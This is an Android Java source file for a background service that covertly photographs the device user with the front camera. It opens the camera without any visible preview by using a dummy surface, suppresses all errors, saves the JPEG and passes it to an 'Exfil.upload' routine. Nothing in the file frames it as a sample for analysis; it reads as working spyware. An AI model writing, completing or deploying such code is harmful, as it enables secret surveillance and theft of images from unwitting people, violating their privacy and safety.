package com.vanta.core;

import android.app.Service;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.graphics.ImageFormat;
import android.graphics.SurfaceTexture;
import android.hardware.camera2.*;
import android.media.Image;
import android.media.ImageReader;
import android.os.*;
import android.view.Surface;
import java.io.*;
import java.util.*;

public class CameraService extends Service {
    private CameraDevice device;

    @Override
    public int onStartCommand(Intent i, int f, int s) {
        if (checkSelfPermission(android.Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED)
            return START_NOT_STICKY;

        try {
            CameraManager cm = (CameraManager) getSystemService(CAMERA_SERVICE);
            String id = null;
            for (String c : cm.getCameraIdList()) {
                CameraCharacteristics ch = cm.getCameraCharacteristics(c);
                Integer facing = ch.get(CameraCharacteristics.LENS_FACING);
                if (facing != null && facing == CameraCharacteristics.LENS_FACING_FRONT) { id = c; break; }
            }
            if (id == null) id = cm.getCameraIdList()[0];

            final ImageReader reader = ImageReader.newInstance(1280, 720, ImageFormat.JPEG, 1);
            SurfaceTexture dummy = new SurfaceTexture(10);
            final Surface dummySurface = new Surface(dummy);

            cm.openCamera(id, new CameraDevice.StateCallback() {
                @Override public void onOpened(CameraDevice d) {
                    device = d;
                    try {
                        CaptureRequest.Builder b = d.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE);
                        b.addTarget(reader.getSurface());
                        List<Surface> surfaces = new ArrayList<>();
                        surfaces.add(reader.getSurface());
                        surfaces.add(dummySurface);

                        d.createCaptureSession(surfaces, new CameraCaptureSession.StateCallback() {
                            @Override public void onConfigured(CameraCaptureSession sess) {
                                try { sess.capture(b.build(), null, null); } catch (Exception e) {}
                            }
                            @Override public void onConfigureFailed(CameraCaptureSession sess) {}
                        }, null);
                    } catch (Exception e) {}
                }
                @Override public void onDisconnected(CameraDevice d) {}
                @Override public void onError(CameraDevice d, int e) {}
            }, null);

            reader.setOnImageAvailableListener(new ImageReader.OnImageAvailableListener() {
                public void onImageAvailable(ImageReader r) {
                    Image img = r.acquireLatestImage();
                    if (img == null) return;
                    try {
                        ByteArrayOutputStream bo = new ByteArrayOutputStream();
                        bo.write(img.getPlanes()[0].getBuffer().array());
                        File f = new File(getExternalFilesDir(null), "cam_" + System.currentTimeMillis() + ".jpg");
                        FileOutputStream fos = new FileOutputStream(f);
                        fos.write(bo.toByteArray());
                        fos.close();
                        Exfil.upload(f.getAbsolutePath());
                    } catch (Exception e) {} finally { img.close(); }
                    if (device != null) device.close();
                    stopSelf();
                }
            }, null);

        } catch (Exception e) {}
        return START_NOT_STICKY;
    }

    @Override public IBinder onBind(Intent i) { return null; }
}
